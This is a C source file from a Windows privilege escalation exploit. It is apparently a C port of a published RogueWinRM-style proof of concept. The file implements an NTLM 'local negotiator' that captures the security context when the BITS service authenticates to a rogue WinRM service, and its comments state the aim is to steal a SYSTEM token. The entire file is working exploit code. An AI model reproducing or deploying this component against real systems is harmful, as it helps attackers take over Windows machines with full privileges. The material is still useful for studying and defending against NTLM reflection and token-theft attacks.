/**
	This module is a plain C class emulation. The POC written by decoder was in cpp and used some classes
	in  particular for the local negotiator.
	See https://stackoverflow.com/questions/40992945/convert-a-cpp-class-cpp-file-into-a-c-structure-c-file
	for how I emulated a class in pure C.

	The local negotiator is an object used to handle security an client-server negotiation data. In this
	exploit, it is used by elevatorService.c (Rogue WinRM service) in order to store security context
	obtained when BITS shoots the Rogue WinRM service, and is required by this service to authenticate.
*/

#include "pch.h"


/**
	Constructor of the LocalNegotiator class. Setup the addresses of class methods,
	and initialize some arguments

	@param		LocalNegotiator* this	Address of the instantiated object.
 */
void Init(LocalNegotiator* this)
{
	// linking of class methods
	this->destruct						= &destructNegotiator	;
	this->processNtlmBytes				= &processNtlmBytes		;
	this->handleType1					= &HandleType1			;
	this->handleType3					= &HandleType3			;
	this->returnType2					= &ReturnType2			;

	// Initialization of attributes
	this->phContext						= (PCtxtHandle)calloc(1, sizeof(CtxtHandle));
	this->phContext->dwLower			= 0						;
	this->phContext->dwUpper			= 0						;

	this->hCred.dwLower					= 0						;
	this->hCred.dwUpper					= 0						;

	this->secClientBufferDesc.ulVersion	= 0						;
	this->secClientBufferDesc.cBuffers	= 0						;
	this->secClientBufferDesc.pBuffers	= NULL					;

	this->secServerBufferDesc.ulVersion = 0						;
	this->secServerBufferDesc.cBuffers	= 0						;
	this->secServerBufferDesc.pBuffers	= NULL					;

	this->secClientBuffer.cbBuffer		= 0						;
	this->secClientBuffer.BufferType	= 0						;
	this->secClientBuffer.pvBuffer		= NULL					;

	this->secServerBuffer.cbBuffer		= 0						;
	this->secServerBuffer.BufferType	= 0						;
	this->secServerBuffer.pvBuffer		= NULL					;

	this->authResult					= -1					;

	return														;
}



/**
	destructor of the LocalNegotiator Class. Free allocated memory

	@param		LocalNegotiator* this	Address of the instantiated object.
 */
void destructNegotiator(LocalNegotiator* this)
{
	free(this->phContext);
	this->phContext = NULL;
	free(this);
	return;
}



/**
	This static function is a router which process NTLM request bytes according to if it is a
	NTLM 1 or 3 request (for calling a security context through handleType in localNegotiator
	object.

	@param		LocalNegotiator*	this		Address of negotiator object
	@param		char*				ntlmBytes	Address of buffer hosting raw bytes of NTLM request
	@param		unsigned short		len			Length of previous buffer argument

	@return		int								Error code. 0 for success.
*/
static int processNtlmBytes(LocalNegotiator* this, char* ntlmBytes, unsigned short len)
{
	int messageType = ntlmBytes[8];

	switch (messageType)
	{
	case 1:
		//NTLM type 1 message
		this->handleType1(this, ntlmBytes, len);
		break;
	case 3:
		//NTLM type 3 message
		this->handleType3(this, ntlmBytes, len);
		break;
	default:
		printf("Error - Unknown NTLM message type...");
		return -1;
		break;
	}

	return 0;
}




/**
	Process the data sent by the first request of BITS server (ntlmBytes)
	by creating a security context stored in the local negotiator instance.

	@param		LocalNegotiator*	this		Address of the instantiated object.
	@param		char*				ntlmBytes	packet sent by BITS server
	@param		unsigned short		len			length of packet sent by BITS (length of prev argument)

	@return		int								Error code. 0 for succes.
 */
static int HandleType1(LocalNegotiator* this, char* ntlmBytes, unsigned short len)
{
	int			status			= -1			;
	LPSTR		lpPackageName	= "Negotiate"	;
	TimeStamp	ptsExpiry						;
	TimeStamp	tsContextExpiry					;
	ULONG		fContextAttr					;

	printf("\n--handleType1 start --\n");
	status = AcquireCredentialsHandleA
	(
		NULL,
		lpPackageName,
		SECPKG_CRED_INBOUND,
		NULL,
		NULL,
		0,
		NULL,
		&this->hCred,
		&ptsExpiry
	);

	if (status != SEC_E_OK)
	{
		printf("Error in AquireCredentialsHandle");
		return -1;
	}

	InitTokenContextBuffer(&this->secClientBufferDesc, &this->secClientBuffer);
	InitTokenContextBuffer(&this->secServerBufferDesc, &this->secServerBuffer);

	this->secClientBuffer.cbBuffer = len;
	this->secClientBuffer.pvBuffer = ntlmBytes;

	status = AcceptSecurityContext
	(
		&this->hCred,
		NULL,
		&this->secClientBufferDesc,
		ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
		//STANDARD_CONTEXT_ATTRIBUTES,
		SECURITY_NATIVE_DREP,
		this->phContext,
		&this->secServerBufferDesc,
		&fContextAttr,
		&tsContextExpiry
	);

	printf("\n-- Result of AcceptSecurityContext() = status: 0x%x--\n", status);
	printf("\n--handleType1 end --\n");
	return status;
}



/**
	Process the data sent by the second request of BITS server, when it answer to the challenge-response
	proposed by the rogue WinRM service (elevatorService.c) by creating a security context stored in the
	local negotiator instance. This security context will be used later to steal a SYSTEM token.

	@param		LocalNegotiator*	this		Address of the instantiated object.
	@param		char*				ntlmBytes	packet sent by BITS server
	@param		unsigned short		len			length of packet sent by BITS (length of prev argument)

	@return		int								Error code. 0 for succes.
 */
static int HandleType3(LocalNegotiator* this, char* ntlmBytes, unsigned short len)
{
	printf("\n--handleType3 start --\n");

	InitTokenContextBuffer(&this->secClientBufferDesc, &this->secClientBuffer);
	InitTokenContextBuffer(&this->secServerBufferDesc, &this->secServerBuffer);

	this->secClientBuffer.cbBuffer = len;
	this->secClientBuffer.pvBuffer = ntlmBytes;

	ULONG fContextAttr;
	TimeStamp tsContextExpiry;
	int status = AcceptSecurityContext
	(
		&this->hCred,
		this->phContext,
		&this->secClientBufferDesc,
		ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
		//STANDARD_CONTEXT_ATTRIBUTES,
		SECURITY_NATIVE_DREP,
		this->phContext,
		&this->secServerBufferDesc,
		&fContextAttr,
		&tsContextExpiry
	);

	this->authResult = status;

	printf("\n-- Result of AcceptSecurityContext() = status: 0x%x--\n", status);
	printf("\n--handleType3 end --\n");
	return status;
}



static char* ReturnType2(LocalNegotiator* this, unsigned short* outbuffer_len)
{
	*outbuffer_len = (unsigned short)this->secServerBuffer.cbBuffer;
	return (char*)this->secServerBuffer.pvBuffer;
}



static void InitTokenContextBuffer(PSecBufferDesc pSecBufferDesc, PSecBuffer pSecBuffer)
{
	pSecBuffer->BufferType = SECBUFFER_TOKEN;
	pSecBuffer->cbBuffer = 0;
	pSecBuffer->pvBuffer = NULL;

	pSecBufferDesc->ulVersion = SECBUFFER_VERSION;
	pSecBufferDesc->cBuffers = 1;
	pSecBufferDesc->pBuffers = pSecBuffer;
}
